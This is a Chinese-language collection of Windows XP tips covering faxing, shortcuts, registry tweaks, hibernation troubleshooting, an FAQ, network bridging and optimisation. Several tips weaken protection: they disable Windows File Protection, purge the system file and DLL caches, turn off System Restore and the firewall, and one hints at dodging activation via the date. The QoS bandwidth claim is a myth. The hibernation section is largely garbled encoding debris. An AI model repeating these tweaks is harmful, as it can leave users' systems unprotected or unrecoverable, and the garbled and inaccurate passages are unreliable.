单击“下一步”，填写收件人的信息，主要包括收件人的姓名和传真机的号码，然后单击“添加”。 
填写完毕后单击“下一步”，将出现“准备首页”的对话框，在此对话框中我们将设置首页的格式以及信息，Windows XP为我们提供了四 种模板，我们可以方便地按照模板的格式来设计我们的传真，单击“发件人信息”，填写一些自己认为需要的个人信息，其他栏目我们只要根据提示填写就可以了。 
接着单击“下一步”，根据自己的需要选择发送时间以及优先级。 
单击“下一步”，可以预览一下传真的效果，满意后单击“完成”，完成传真发送向导。 
这时电脑将通过你的Modem开始发送传真，“传真监视器”的对话框也将自动弹出来。 
至此，发送传真的全过程便结束了，需要特别说明的是前面提到的“传真首页模板”一项，Windows XP一共给我们提供了四个模板，当然我们也可以自己设计模板，在“传真控制台”的界面中，单击“工具” →“个人首页” →“新建”，即可自行设计传真的首页模板。 
接收传真 
Windows XP同样也为我们准备了接收传真的功能，我们只需要在“传真控制台”中，单击“文件” →“立即接收传真”，即可接收到你的传真了，在“传真控制台”中的“收件箱”便可以阅读到刚刚接收到的传真了，如下图所示。 
怎么样，用Windows XP接收和发送传真还是很方便的吧！其实早在Windows 95时，微软就已经为我们提供了传真功能。可不知为什么，到了Windows 98又不提供此功能了。还好，Windows XP又把此功能捡了回来。而且功能和稳定性上都有了很大的提高，使我们的Modem又焕发了青春。Modem是一个使数字信号与模拟信号相互转变的设备，电脑上的传真功能正是利用Modem这一特性来实现发送和接收传真的。如果你的电脑配有扫描仪、打印机的话，那可就成了一台真正的传真机了。 
6 Windows XP的几个使用技巧 
一、快速缩放网页字体 
　　笔者无意中将书压在了Ctrl键上，再用鼠标滚轮滚动网页时，发现网页并没有上下滚动，取而代之的是网页字体的缩放。按住Ctrl键后，向上滚动滚轮字体缩小，向下滚动放大。这个技巧只对网页上的文字有效，对图片无效。 
二、屏幕键盘 
　　用鼠标点开始-〉运行-〉敲入osk,就会弹出屏幕键盘，您就可以用鼠标完全操作键盘。您还可以建立一个快捷方式快速启动屏幕键盘。在桌面上点鼠标右键-〉新建-〉快捷方式-〉敲入osk-〉回车就完成了。如果您一只手拿着手机在通话，另一只手用鼠标操作键盘，十分方便。 
三、关闭报告错误 
　　点开始-〉运行-〉敲入msconfig-〉服务-〉把Error Reporting Service单选框的勾点掉，再点确定就OK了。以后再也没有程序因错误或兼容性不好被强行关闭后弹出的讨厌的报告错误对话框了。 
四、快速打开控制面板 
　　把鼠标移动到“开始”上-〉点鼠标右键-〉属性-〉自定义（开始菜单）-〉高级-〉开始菜单项目-〉显示为菜单-〉确定就行了，您以后就可以像打开程序一样在“开始”菜单中打开一个控制面板的项目，很节约时间。 
五、windows XP常用快捷键 
　　win：打开“开始”菜单 
　　win+D：最小化或恢复windows窗口 
　　win+E：打开“资源管理器” 
　　win+F：打开“搜索”对话框 
　　win+Ctrl+F：打开“搜索计算机”对话框 
　　win+F1：打开“帮助和支持中心” 
　　win+R：打开“运行”对话框 
　　win+break：打开“系统属性”窗口 
　　win+L：锁定计算机 
　　win+U：打开“辅助工具管理器” 
　　 
六、快速拷贝文件 
　　笔者又这样的习惯，过一段时间就把硬盘上的文件分类整理一下，把图片放在picture文件夹中，mp3文件放在music文件夹中等等，但来回复制、粘贴真的很烦琐，现在让我们用一个简单的方法快速拷贝文件。选中一个文件夹如music-〉点鼠标右键创建一个快捷方式-〉复制这个快捷方式-〉在SendTo文件夹中粘贴此快捷方式。 
　　SendTo是windowsXP的系统文件夹，“发送到”功能就是由它来实现的。现在我们选中任意一个mp3，点鼠标右键在发送到中选择“快捷方式到music”，这个mp3文件就被复制到了music文件夹中，是不是very easy！您还可以根据自己的需要制作software、txt、webpage等等，就看您的了！ 
七、给分页文件搬家 
　　windows XP运用的虚拟缓存技术可以将磁盘作为虚拟内存来使用，但同时会占用大量的硬盘空间，这对于拥有小硬盘和将系统区分得很小的用户来说是很痛苦的，不但运行速度慢，而且windows会不时的让你整理磁盘，在windows9x和me下您是无法把分页文件pagefile.sys移动的，在XP下您可以把这个文件移动到任何一个分区。操作过程如下：我的电脑-〉（点鼠标右键）属性-〉高级-〉设置（性能）-〉高级-〉更改（虚拟内存）。在对话框中您就可以制定把分页文件放在哪个分区以及文件的大小，给您充分的自由。 
7： Windows XP的小秘密 
自从微软发布Windows XP以来，Windows XP已经得到人们越来越广泛的应用，微软也宣称它是迄今为止最好的操作系统。Windows XP到底有什么出色的地方？让我先来告诉你其中的一些小秘密吧！ 
　　● 关闭自动播放功能 
　　一旦您将媒体插入驱动器，自动运行就会从驱动器中读取数据，这会造成程序的设置文件和在音频媒体上的音乐立即开始。你可以用下面这个办法关闭这个功能：点“开始”→“运行”，在对话框中输入“gpedit.msc” →“计算机配置”→“管理模板”→“系统”，双击“关闭自动播放”，在“设置”中选“已启用”，确定即可。 
　　● 使ZIP文档读取能力失效 
　　Windows XP默认支持.ZIP文档，但系统会为此耗费大量资源，你可以将这一功能关闭，只需在“开始”选单的“运行”中输入“regsvr32/u zipfldr.dll”即可。 
　　● 卸载无用的动态链接 
　　资源管理器经常在内存中留下无用的动态链接，为了消除这种现象，你可以打开注册表编辑器，设置键值：HKEY_LOCAL_MACHINE＼ SOFTWARE ＼Microsoft＼Windows＼CurrentVersion＼Explorer。 
　　AlwaysUnloadDLL=DWORD: 1将其设为0，这一功能就会被关闭。注意：为了让设置生效，需要重新启动计算机。 
　　● 消除Windows文档保护功能 
　　为了完全消除Windows文档保护功能，打开注册表编辑器，设置键值：HKEY_LOCAL_MACHINE＼ SOFTWARE＼Microsoft＼Windows NT＼CurrentVersion＼Winlogon SFC Disable=0xFFFFFF9D 
　　● 查看驱动器组件信息 
　　右键点击“我的电脑”，点选弹出选单中的“管理”，依次打开“可移动存储”→“库”，用右键点击所要查询的驱动器，点选弹出选单中的“属性”，点选“设备信息”就可看到驱动器的信息了。 
　　● 在关机时清空页面文件 
　　打开“控制面板”，点击“管理工具”→“本地安全策略”→“本地策略”→“安全选项”，双击其中“关机：清理虚拟内存页面文件”一项，点击弹出选单中的“已启用”选项，单击“确定”即可。
8:Windows XP挂起到硬盘后的异常故障解决 
£牐燱indows XP除了界面上的美观和安全性能大大提高外，在很多小地方考虑得很周到，体贴方便了用户。比如它的储存当前状态到硬盘，然后开机不必再经过硬件的初始化，直接从储存的状态读取数据，一般能在15秒左右开机，启动的速度大大提高。但是，由于硬件和软件的兼容性，使用XP的这种功能的时候，可能会遇到一些异常的情况，下面就分析一下并给出参考的解决办法： 
一、板载声卡发音不正常 
£牐犗衷诤芏嘀靼宥几酱ø了AC97的声卡，如果您的机器里的板载声卡是软声卡，那么有可能会在挂起到硬盘后，第二次快速开机的时候，发现声音不正常。笔者见过一块精英的SIS735主板上附带的软声卡就是如此——不仅在windowsXP快速开机后发音不正常，在windows98退出到纯DOS状态后，再用EXIT指令回到windows图形界面的时候，声卡根本不发音。 
£牐牪慰嫉慕饩霭旆ǎ河捎谡馐怯布þ方面的问题，故此人工调整的机会不大。可以尝试更换最新的驱动程序，如果不行，就只好买一块外接的声卡或是老老实实地重新启动电脑了。值得注意的是，在XP中，此时声卡还是有很小沙哑的声音的，听起来就像音箱的问题不是声卡的问题，实际却是这种声卡必须经过硬件的重新初始化才能重新使用造成的。这才是我写出这点异常情况真正原因，免得大家在音箱上浪费时间，甚至乱“调整”损坏了音箱。 
二、显示不正常（花屏或黑屏） 
£牐犛械幕ú器，在快速开机或是从SLEEP状态唤醒后，可能会出现花屏和黑屏现象。这可能有三种原因： 
£牐 1、显示卡驱动的不完善：这算是最轻的故障，你找一个稳定的驱动程序版本安装就是； 
£牐 2、电源功率对显示卡的影响：有的劣质电源功率不够，会造成AGP显示卡的供电不足，而XP的重新快速开机是不再初始化硬件的，依赖主板的ACPI功能，所以可能会在电源方面有些影响。 
£牐牪慰嫉慕饩霭旆ǎ阂皇窃贐IOS里和windows的电源选项里进行调整，尽量不使用花哨的功能；二是可以建立一个文本文件的快捷方式，放在桌面上，加上自己定义的快捷键，在黑屏或花屏的时候，按快捷键启动这个文本，可能会在屏幕的部分区域显示出文本的内容，多用鼠标点击切换几次画面，显示卡因为刷新了显存中的内容，可能会恢复正常的显示，这是个有点旁门左道、治标不治本的法子，但很实用，呵呵。 
三、快速开机后鼠标无法移动 
£牐犝庵止收喜⒉皇撬阑ú，键盘还是有响应的。其实在以前的windows9X里的唤醒后，也有出现。可能会有两种情况： 
£牐 1、你的鼠标和主板或是电源不兼容。 
£牐 2、你的鼠标是冒牌货，所以windowsXP在使用相应内置的驱动程序的时候，识别上有问题，造成一些BUG。 
£牐牪慰嫉慕饩霭旆ǎ合仁允园咽蟊臧蔚簦¬再插上，利用windows的即插即用再次检测鼠标，但这样长久可能会损坏主板接口；更换其他品牌的鼠标，最好是正品鼠标；或是把鼠标的连接从PS/2接口与串口切换一下试试，有些PS/2接口的鼠标是不太适应XP的新功能的。顺便提醒一句，别小看鼠标的冒牌问题，以为能用就成——在安装windowsXP和windows2000的时候，经常就因为假鼠标造成安装的失败。 
四、激活问题 
£牐爓indows XP加入了激活的设置防止盗版。有的人安装的是30天要激活的版本，如果你的主板电池掉电了，开机的日期不正常，在快速开机的“欢迎使用”之后，windows XP可能会提示你必须激活才能使用。因为有的人贪图方便，可能会在没保存或转移某些重要文档的情况下就用了挂起到硬盘的功能，遇到激活提示的时候，因为激活功能锁定了系统，不能再进入图形界面处理未完成的文档而损失工作的成果。这虽不算快速开机的真正故障，也不算很普遍，还是要提醒大家的，如果你不想激活产品，那么注意你的日期哦——因为快速开机毕竟也是一种重新启动，windowsXP是会检测的。
9： Windows XP精彩答辩 
　　为何我在DOS下安装Windows XP 很慢 
　　哈哈，你一定没有在安装前运行smartdrv.exe,如果不运行这个，可能一个晚上你也安装不完。Smartdrv.exe这么文件在windows 98/me的光盘或是windows/command/里有。 
　　为何安装过程中系统提示我必须转化分区为NTFS 
　　哈哈，这个是因为你在windows 下安装的时候安装的不仔细，刚开始安装的时候有个高级-再安装过程中允许我选择安装到的分区。重新运行安装程序，记得选择这个，然后重新启动后就可以选择安装到的分区和是否保留原分区格式，或是格式化为NTFS OR FAT32等等。 
　　为何我的modem不能在XP下工作 
　　这个主要是因为驱动程序的问题，很多猫的Windows 2000下的驱动程序也不能在XP下用了，不过倒是有些猫的98的驱动程序可以在XP下用。另外，金网霸ESS芯片的内猫以及一些rockwell芯片的内猫都可以在XP下很好的工作，用XP自带的驱动即可，而且对于金网霸内猫的用户XP下的驱动没有了像Windows 2000下那样电话打进来就死机的问题了。 
　　为何我安装了 Windows XP 关机总是变成重起 
　　哈哈，能遇到这个问题算你幸运了，这个问题是有些主板的高级电源管理不能被WindowsXP支持。一般用AWARD的BIOS的主板的电脑没有这个问题，到目前为止，遇到AMI的BIOS的主板有这个问题，如技嘉的主板。解决的办法是升级你的主板的BIOS，即刷新BIOS.,哈哈，可不要刷错了型号。 
　　为何我的QQ在 Windows XP下运行很慢 
　　这个问题好像是目前版本的QQ和Windows XP不大兼容，尤其是老的版本，QQ710还可以，难道是微软为了推广MSNMessenger故意这么做的？哈哈哈……看来我们要等QQXP了。 
　　为何我的Windows XP 下的Internet Explorer 运行很慢 
　　这个问题嘛，如果你的机器CPU和内存够用的话，一般没这个问题。不过嘛，我发现，如果你对IE的高级选项里的东西做了改动，如一些效果等等，本来关掉这些效果为了加速IE,其实，这时就会出现IE运行很慢，尤其是显示上面的菜单和工具栏的时候。解决办法就是高级选项的面板上，点击默认，使用IE默认的设置即可。 
　　为何我的 Windows XP 安装了简体中文语言包后还是英文的 
　　在一些BBS上，我发现很多朋友不大会安装这个语言包，其实安装好了后，欢迎屏幕已经由WELCOME变成了欢迎了，至于界面，到控制面板，地区区域选项，菜单显示，选择简体中文即可，注销后重新登录即可。如果你不选择所有用户都使用这个配置的话，你会发现，其它用户里面还是英文界面的，哈哈，这次可以中英文版同时用了。 
　　为何MPEG4格式AVI在Windows Media Player 8.0 不能放 
　　有时候用Media player放avi的时候只有声音没有图像，或是不能放，这是由于缺少解码器的原因，到www.divx.com 下载安装divx即可。 
　　为何安装了Windows XP后，我的其它操作系统里的Norton antivirus 2001不能用了 
　　这个是由于Norton2002以前版本的Norton杀毒软件和Windows XP不兼容，而且要命的是这个不兼容是由于新版的操作系统的ntldr,ntdetect.com, 冲突造成的，如果你不用旧版的文件代替，即使删掉Windows XP也没用的。解决办法是到symantic的网站下载补丁，或是使用norton2002,目前norton antivirus 2002可以很好的在XP下运行。 
　　为何PS手柄驱动不能在XP下用 
　　更换手柄驱动程序可以解决。去这里下载：www.topcmm.com下载后，如果运行setup安装不成功，用添加删除新硬件安装驱动。 
　　关于局域网里Windows XP 的网络问题 
　　Windows XP的安全性提高，默认不启用NBT.有时候，在局域网里使用自带的防火墙会出现的访问问题，关掉防火墙即可。 
　　关于Windows XP下的显卡驱动问题 
　　Windows XP自带了FOR NVIDIA系列的显卡驱动程序一般没有问题，而目前的新版的雷管XP驱动在某些机器上安装后会出现问题，建议大家使用系统自带的驱动。NVIDIA目前正在修正雷管驱动。 
　　Windows XP 安装好后，如何把FAT 32转化为NTFS 
　　使用convert命令，在命令行模式下用convert.exe这个命令随时转化的。例如： 
convert c: /fs:ntfs把c盘转化为NTFS. 
　　Windows XP下如何创建启动软盘 
　　插入软盘，然后在软盘驱动器的图标上点击右键，弹出菜单选择格式化，在格式化窗口里最下边选择创建MS-DOS启动盘即可。 
10： Windows XP深入问答 
　　1、我使用Windows XP系统，请问使用什么方法可以提高启动速度？ 
　　使用微软提供的“Bootvis”软件可以有效的提高Windows XP启动速度。这个工具是微软内部提供的，专门用于提升Windows XP启动速度。下载后解压缩到一个文件夹下，并在“Options”项中设置使用当前路径。之后从“Trace”项下拉菜单中选择跟踪方式。该程序会引导Windows XP重新启动，并记录启动进程，生成相关的BIN文件。之后从Bootvis中调用这个文件，从Trace项下拉菜单中选择“Optimize system”命令即可。 
　　2、我使用Windows XP时发现，随着不断地增加、删除应用程序，磁盘可用空间不断减少，这是为什么？ 
　　从Windows 2000开始，Windows会在每个硬盘分区中建立一个“System Volume Information”文件夹，在该文件夹中提供的是系统默认保存的系统还原备份文件。不过Windows 2000还没有正式提供系统还原功能，在XP中，你可以看到相关的选项。为防止这个问题发生，最简单的方法就是关闭“系统还原”功能。如果要删除这个文件夹中保存的文件，你需要以Administrator（管理员）身份登录系统。 
　　3、如何提高Windows XP的运行速度？ 
　　Windows XP虽然提供了一个非常好的界面外观，但是不可否认这样的设置也在极大程度上影响了系统的运行速度。如果你的机器运行起来速度不是很快，建议将所有的附加桌面设置取消，也就是将Windows XP的桌面恢复到Windows 2000样式。设置的方法非常简单，在“我的电脑”上单击鼠标右键，选择“属性”，在“高级”选项卡中单击“性能”项中的“设置”按钮，在关联界面中选择“调整为最佳性能”复选框即可。此外，一个对Windows XP影响重大的硬件就是内存。使用256MB内存运行Windows XP会比较流畅，512MB的内存可以让系统运行得很好。 
4、我在Windows XP中设置了用户存取磁盘权限，但是后来由于不慎将用户删除，现在不能查看被加密的磁盘和文件了，怎么办？BTW：使用PQ不能将该分区转换为FAT32分区。 
　　Windows XP具有更高的安全性能，如果设置用户的时候使用了权限保护功能，其他用户是不能直接访问你的文件夹的，即使是系统管理员。这样虽然安全，但是出了问题也是非常头痛的事情。如果你正好遇到这样的问题，必须以Administrator身份登录，然后在文件夹选项中的“View（查看）”选项卡中的“Advanced Settings（高级设置）”列表窗口中关闭“Use simple file sharing（使用简单文件共享）”复选框。之后返回相应的文件夹或者磁盘分区，在关联的菜单中选择“Properties（属性）”命令，切换到“Security（安全）”选项卡，此时可以看到其中没有允许访问的任何用户，单击“Advanced（高级）”按钮，进入高级设置界面。切换到“Owner（所有者）”选项卡，在其中如果有你的用户列表，选择它，并选择界面下边的 “Replace owner on subcontainers and objects（替换子容器及对象的所有者）”复选框，单击“Apply（应用）”添加设置，此时你可以看到在“Permissions（权限）”选项卡中看到你的名字了。当然，如果在“Permissions（权限）”选项卡中允许你添加新的访问用户，则可以忽略上面的操作。单击“OK（确定）”按钮返回，现在就可以访问原来加密的文件夹，或者磁盘了。此外，如果你在“Pemissions”选项卡中看到了一个很长的“S-1-5-21-xxxxx”等全部是数字组成的用户，这可能就是以前创建的用户名，但是它已经损坏了，选择该用户，清除界面中的“Inherit from part the permission entries that apply to child objects. Inculde these with entries explicitly defined here（从父项继承那些可以应用到子对象的权限项目，包括那些在此明确定义的项目）”复选框。在关联的界面中选择“Copy（复制）”命令，之后可以将这个无用的用户删除。 
　　5、我安装了Windows XP，在“添加/删除程序”里没找到制作启动盘的程序，我该怎么办？ 
　　在Windows XP中并没有自带制作启动盘的程序，需要使用其他工具才能实现，你可以在以下地址下载到相应版本的制作工具。 
　　家庭版本 http://soft.km169.net/soft/html/2955.htm 
　　在使用中需要注意的是，此程序做的启动盘只能供Windows XP使用，并且要使用此程序你需准备6张格式化的空白1.44MB高密度软盘，其中第一号盘就可以用来启动计算机。 
11：Windows XP网桥功能初探 
　　如今，在Windows XP中，已经集成了连接不同网段的“网桥（Bridge）”功能，它的配置简单易行，大大方便了中小型局域网之间的互联与拓展。 
　　在配置Windows XP 的网络组件时要注意以下几点： 
　　1、配置Windows XP的网桥服务器不要配制成域控制器，只需配置成为独立的服务器即可。 
　　2、安装的两块网卡均要保证工作正常，检验方法为：打开“控制面板→系统”，找到“硬件”选项卡，点击“设备管理器”，展开“网络适配器”，看到两块网卡的图标之前没有黄色惊叹号，“设备状态”为“工作正常”即可。 
　　3、Windows XP网桥所支持的网络通信协议是TCP/IP，只能在以TCP/IP协议通讯的网络中转发数据包。但是，网络中的主机操作系统却不一定要是Windows系列，如果是Linux或其他的操作系统，只要是正确装载了TCP/IP协议，Windows XP网桥一样可以与其协同工作。 
　　下面，我们开始一步步配置Windows XP网桥。 
　　第一步：给网桥中的两个不同网段接口分配不同的IP地址。我们要互联的两个网段一个是10.0.0.0，在网桥中我们可任选一块网卡，给它分配固定的IP地址10.0.0.1，作为10.0.0.0的网络接口。具体方法为：打开“控制面板”，选“网络”，选中“本地连接”（第一块网卡）的“属性”，打开“TCP/IP”，选中“指定IP地址”，填入10.0.0.1，子网掩码为255.0.0.0，网关为10.0.0.1即可。 
　　同理，我们可以给“本地连接2”（第二块网卡）指定IP地址为192.168.0.1，子网掩码为255.255.255.0，网关为192.168.0.1。 
　　第二步：启动Windows XP网桥。在“本地连接”（第一块网卡）上单击鼠标右键，找到“新建网桥（Create Bridge）”，点击之后，Windows XP即会出现一个“网桥（Network Bridge）的图标。但由于此时只有一个网络接口存在于网桥中，因此网桥还暂时不能工作（网桥图标上有红叉）。我们在“本地连接2”（第二块网卡）上同样执行一次“新建网桥（Create Bridge）”的操作之后，可以看到网桥的图标已发生了改变。在网桥图标上单击鼠标右键，选择“属性”，可以检查刚刚加入的这个网络接口的各项属性，如网卡名称，各自绑定的IP地址等。 
　　第三步：网桥启动之后，将10.0.0.0网段内的主机网关一律设为10.0.0.1，将192.168.0.0 网段内的主机网关一律设为192.168.0.1。我们在10.0.0.0的网段内任选一台电脑，如10.0.0.2，在命令行内键入“ping 192.168.0.2”，如能收到“Reply from 192.168.0.2……”的回应，即可说明网桥工作正常，两网段已经连通并可互传文件。 
　　笔者还要补充两点： 
　　1、Windows XP网桥不只局限于连接两个网段，它可以连接多个网段，将网段的接口按照上面所说的方法依次加入即可。 
　　2、Windows XP网桥只能采取手动指定网络路径的方式，因此效率不会很高，在大型的局域网中，所需转发的数据包流量很大时，它的作用比不上专用的路由器。 
12：Windows XP硬件优化全功略 
　　相信大家都想令自己的Windows XP启动速度更快，工作更稳定，那么如何做呢，下面我们就来简单介绍一下如何从优化Windows XP。 
一、缩短启动时间 
　　推荐大家使用微软发布的Bootvis软件，它能够对系统进行自动优化，以缩短启动所用的时间，在“Trace”中选择“Optimize System”然后重新启动即可；另外也可以通过Windows XP内建的MsConfig设置程序减少启动时所加载的程序来缩短启动时间，只在运行中输入启动“msconfig”再通过“Startup”进行相关设置即可。 
1)、Bootvis 
2)、msconfig 
二、设置处理器二级缓存容量 
　　Windows XP无法自动检测处理器的二级缓存容量，需要我们自己在注册表中手动设置，首先打开注册表(运行中输入“Regedit”)，再打开: 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\ 
　　选择“SecondLevelDataCache”，根据自己所用的处理器设置即可，例如PIII Coppermine/P4 Willamette是“256”，Athlon XP是“384”，P4 Northwood是“512”。 

三、安装UPnP安全补丁程序 
　　微软最新发布了针对Windows XP的UPnP安全补丁程序，该程序修正了WinXP中存在的安全漏洞，大家可以通过下面的地址更新： 
Windows XP Home & Pro UPnP Patch 
四、关闭系统还原及休眠支持 
　　虽然这两项功能也并非完全没有任何作用，但考虑到需要需要占用很大的硬盘空间，所以最好把它们关闭；首先鼠标右健单击桌面上的“我的电脑”，选择“属性”，找到“系统还原(System Restore)”，在“Turn off System Restore on all drives”前打上勾就可以了。 

休眠支持只需要通过控制面板 -> 电源选项 -> 休眠(Hibernate)，把“Enable Hibernate”前面的勾去掉就可以了，这样一来可以空出512MB的硬盘空间。 
五、释放QoS Packet所占用的20%网络带宽 
　　Windows XP内建的QoS Packet需要占用20%的网络带宽，还好我们可以通过“Group Policy”来关闭，具体步骤如下: 在运行中输入“gpedit.msc”，启动该程序后，选择Computer Configuration -> Administrative Templates -> Network -> QoS Packet Scheduler，选择右边的“Limit reservable bandwidth”，设置为“Enabled”，再把“Bandwidth Limit”设置为“0”。 
六、禁止虚拟内存(页面交换文件)执行 
　　本方法最好在配备256MB以上内存(推荐384MB或512MB)的系统上使用，具体步骤为，启动注册表编辑器，然后找到： 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\ 
　　选择“DisablePagingExecutive(禁止页面文件执行)”，设置为“1”，这样可以从一定程度上改善内存的性能，提高系统的运行速度，毕竟内存比硬盘快得多。 
七、删除Windows XP中不需要的组件 
1)、删除系统文件备份，执行sfc.exe /purgecache 
2)、删除驱动备份，删除WINDOWS(XP安装目录)\driver cache\i386目录下的Driver.cab文件 
3)、删除DLL备份文件，目录为WINDOWS(XP安装目录)\system32\dllcache, 
4)、删除WINDOWS(XP安装目录)\ime下不用的输入法 
八、验证Windows XP是否已激活 
　　在运行中输入“oobe/msoobe /a”；版本号可以通过WINDOWS(XP安装目录)system32/NTOSKRNL.EXE，鼠标右键 -> 选内容查看即可。 
九、设置IRQ优先权 
　　从HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\PriorityControl，在右边新建名为“IRQ#Priority”的DWORD键值，其中“#”为相关设备的IRQ号，例如“8”，然后把键值设置为“1”即可；如果遇到IRQ问题，可以试试这个方法。 
十、加快关机速度 
　　与启动一样，Windows XP的关机速度也是一样的慢，要加快关机速度，首先我们先要通过注册表开启WinXP的自动结束任务功能(AutoEndTasks)，具体步骤为: 找到HKEY_CURRENT_USER\Control Panel\Desktop，把AutoEndTasks的键值设置为1即可。 
　　然后再修改“HungAppTimeout”为“4000(或更小)”(预设为50000)，该键值同样也在HKEY_CURRENT_USER\Control Panel\Desktop目录下；最后一步再找到HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\，同样把WaitToKillServiceTimeout设置为“4000”；通过这样设置后的关机速度明显快了一些， 
十一、完全关闭Windows XP文件保护功能 
　　从注册表中找到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon，修改“SFCDisable”键值为“FFFFFF9D”，如果需要重新启用该功能，重新设置为“0”就可以了。 
十二、启动硬盘/光驱DMA模式 
　　打开系统属性 -> Hardware(硬件) -> Device Manager(设备管理器) -> IDE ATA/ATAPI controllers，选择“Primary IDE Channel”或“Secondary IDE Channel”，检查DMA模式是否已启动，一般来说如果设备支持，系统就会自动打开DMA功能；另外驱动器现在所用的传输模式也可以在这里看到。 
十三、禁用Dr. Watson调试程序 
　　在运行中输入“drwtsn32”，然后把除了“(Dump All Thread Contexts)转储全部线程上下文”之外的全都去掉，否则一旦有程序出错，硬盘会响很久，而且会占用很多硬盘空间。 
13：Windows XP优化指南 
　　动手前的准备 
　　动手之前，首先要确保以管理员的身份登录操作系统，因为普通用户身份下好些选项是无权使用的。接下来请激活清晰字体（ClearType），ClearType能使桌面的文字看起来更加清晰易读——这对于手提电脑或液晶显示器用户尤其重要，请看下面关闭和打开ClearType（清晰字体）。
　　要激活ClearType，请打开控制面板的显示属性，点击“Appearances（外观）”选项卡，然后点击“Effects...（...效果）”按钮，就会弹出如下对话框（由于笔者用的是英文版，涉及到Windows界面的东东，下面均采用前面这样写出英文并括号中注明中文意思的方式）： 

勾上“Use the following method to smooth edges of screen fonts...（用下列方法圆滑屏幕字体边缘）”并在下拉菜单中选择“ClearType（清晰字体）”，然后点击OK（确定），Apply（应用）按钮。 
　　效果好多了吧？下面我们看看其它的优化！ 
　　好哩……先来看看一些基本的优化。其中有些是Windows 95/98/ME等以前版本上都有的优化设置，在XP中同样有效，所有这些优化设置都是在在Windows XP Professional版中测试的——它们多半在XP 家庭版中同样有效，有些优化在家庭版中改了个名而已。 
优化一——MsConfig 
　　大多数朋友都应该熟识MsConfig了，这是一个系统内置的Windows设置工具。点击开始菜单，选择“运行”，然后在录入框中敲入“msconfig”回车。我们要动手脚的是“Startup（启动）”选项卡，点击它，就可以看到这个界面： 
　　这个选项卡中显示了Windows启动时运行的所有程序。这里没有一个程序对Windows来说是生死悠关的，所以放心大胆地把不要的去掉。图中可以看到，笔者把NDetect（ICQ的启动程序）和WinAmpa（就是MP3播放器Winamp了）。把部分勾勾去掉之后，Windows启动会快些，同时空闲的系统资源也会多出一些。 
　　优化二——其它启动优化 
　　做完前面的优化，让我们进一步深入其它启动项。再次点击开始——>运行，在录入框中敲入“services.msc”，回车后弹出如下窗口： 
　　这是Windows启动过程的更详细列表，凡是在名字右边标着“Automatic（自动）”的项目都是Windows启动时运行的软件。鼠标单击选中其中一条，就会显示出一些文字，说明它有什么作用。中果决定不需要某种服务，只要右键点击它，把属性中的“Automatic（自动）”改为“Manual（手动）”就得了。 
优化三——IE网络浏览器加速技巧 
　　Windows XP自带Internet Explorer 6，有个小技巧，修改之后启动得飞快（在我的机子上，简直是瞬间启动）。有些朋友试过为“半条命”游戏建个快捷方式，用一定方法修改之后启动加快，这里也是同样原理。右键点击Internet Explorer快捷图标（如任务栏上的快捷启动栏中那个IE图标），打开图标属性之后在“Target（目标）”后面加上“-nohome”参数（前有空格一个）。 
　　优化四——菜单延迟 
　　另一个简单的优化小把戏，就是把滑出菜单时的延迟去掉。修改这个，要用到注册表编辑器（点击开始——>运行，然后敲入“regedit”回车）。要修改的键值在 HKEY_CURRENT_USER\\Control Panel\\Desktop。具体要修改的键名是MenuShowDelay——只需把值改为0就得了。记住，要重新启动计算机后更改才生效。 
优化五——GPEDIT和Autoplay 
　　Windows XP自带了一个非常好用的优化文件，它就是gpedit.msc。开始——>运行，敲入“gpedit.msc”并回车。这是一个非常有效的编辑工具，可以非常方便地修改一些常见的设置。譬如，你不喜欢CD自动播放的话，用这个工具修改再简便不过了，运行gpedit.msc之后，依次点击Computer Configuration（计算机设置）——>Administrative Templates （管理模板）——>System（系统），这里可以看到一个“Turn off Autoplay（关闭自动运行）”值，右键点击它选择“属性”： 
　　这里还有很多其它的设置，自己慢慢玩，看有什么值得优化的吧。 
　　优化六——寻找“添加/删除”菜单中隐藏了的选项 
　　不喜欢MSN Messenger吗，或是想把Windows Media Player媒体播放器给删掉？可惜打开控制面板中的“添加/删除程序”，Windows XP自带的程序都不在里面。其实很容易找到，只需用记事本打开Windows\\inf\\sysoc.inf文件，找到类似下面这一段： 
[Components] 
NtComponents=ntoc.dll,NtOcSetupProc,,4 
WBEM=ocgen.dll,OcEntry,wbemoc.inf,hide,7 
Display=desk.cpl,DisplayOcSetupProc,,7 
Fax=fxsocm.dll,FaxOcmSetupProc,fxsocm.inf,,7 
NetOC=netoc.dll,NetOcSetupProc,netoc.inf,,7 
iis=iis.dll,OcEntry,iis.inf,,7 
com=comsetup.dll,OcEntry,comnt5.inf,hide,7 
dtc=msdtcstp.dll,OcEntry,dtcnt5.inf,hide,7 
IndexSrv_System = setupqry.dll,IndexSrv,setupqry.inf,,7 
TerminalServer=TsOc.dll, HydraOc, TsOc.inf,hide,2 
msmq=msmqocm.dll,MsmqOcm,msmqocm.inf,,6 
ims=imsinsnt.dll,OcEntry,ims.inf,,7 
fp_extensions=fp40ext.dll,FrontPage4Extensions,fp40ext.inf,,7 
AutoUpdate=ocgen.dll,OcEntry,au.inf,hide,7 
msmsgs=msgrocm.dll,OcEntry,msmsgs.inf,hide,7 
RootAutoUpdate=ocgen.dll,OcEntry,rootau.inf,,7 
IEAccess=ocgen.dll,OcEntry,ieaccess.inf,,7 
　　这是当前所有已安装部件列表，继续前面MSN Messenger的例子，这个程序条目名是“msmsgs”，在倒数第三行。可以看到被我标为红色的“hide”字样，就是这个参数在控制Windows“添加/删除程序”中不显示这一项。只需把“hide”删掉就得了，如下： 
　　msmsgs=msgrocm.dll,OcEntry,msmsgs.inf,hide,7 
　　改为： 
　　msmsgs=msgrocm.dll,OcEntry,msmsgs.inf,,7 
　　现在重新启动计算机，就可以在“添加/删除程序”列表里看到MSN Messenger了。如果想要在添加/删除程序里看到所有的已安装组件，只需用记事本打开sysoc.inf文件，用记事本的查找/替换功能把所有“,hide”替换为“,”就行了。 
优化七——关闭Windows的文件保护 
　　警告：这样修改之后可以直接删除Windows的关键文件。 
　　默认状态下系统禁止用户删除系统和程序文件，经过修改注册表可以彻底解除这个限制。打开注册表找到HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows 
NT\\CurrentVersion\\Winlogon 中的SFCDisable，把它的值改为0xFFFFFF9D，如下图： 
